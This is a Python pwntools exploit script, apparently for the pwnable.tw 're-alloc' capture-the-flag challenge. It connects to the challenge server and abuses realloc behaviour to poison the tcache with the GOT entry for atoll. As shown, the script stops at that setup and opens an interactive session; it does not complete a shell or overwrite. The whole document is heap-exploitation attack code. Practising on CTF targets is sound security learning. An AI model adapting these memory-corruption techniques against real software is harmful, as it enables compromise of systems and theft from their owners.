from pwn import *

# io = process("./re-alloc")
io = remote("chall.pwnable.tw", 10106)
e = ELF("./re-alloc")
l = ELF("/lib/x86_64-linux-gnu/libc-2.27.so")
# l = ELF("./libc-9bb401974abeef59efcdd0ae35c5fc0ce63d3e7b.so")

def choose(option):
	io.sendlineafter("Your choice: ", str(option))
def indexOf(idx):
	io.sendlineafter("Index:", str(idx))
def sizeOf(size):
	io.sendlineafter("Size:", str(size))
def dataOf(data):
	io.sendafter("Data:", str(data))

def realloc(idx, size, data):
	choose(2)
	indexOf(idx)
	sizeOf(size)
	if size > 0:
		dataOf(data)
def alloc(idx, size, data):
	choose(1)
	indexOf(idx)
	sizeOf(size)
	if size > 0:
		dataOf(data)
def free(idx):
	choose(3)
	indexOf(idx)

alloc(0, 0x78, 'XXXX')
realloc(0, 0, '')
realloc(0, 0x58, p64(e.got['atoll']) + p64(0)) # overwite tcache_entry.key
# tcache(0x80) -> 0x60 -> atoll

alloc(1, 0x78, 'XXXX')
free(0)
# tcache(0x80) -> atoll
# 0 -> null
# 1 -> 0x60

realloc(1, 0x38, p64(e.got['atoll']) + p64(0))
# tcache(0x60) -> 0x40 -> atoll
alloc(0, 0x58, 'XXXX')
free(1)

# 0 -> 0x40
# 1 -> null
realloc(0, 0x38, p64(0)*2)
free(0)

# tcache 0x80 -> atoll
# tcache 0x60 -> atoll
io.interactive()
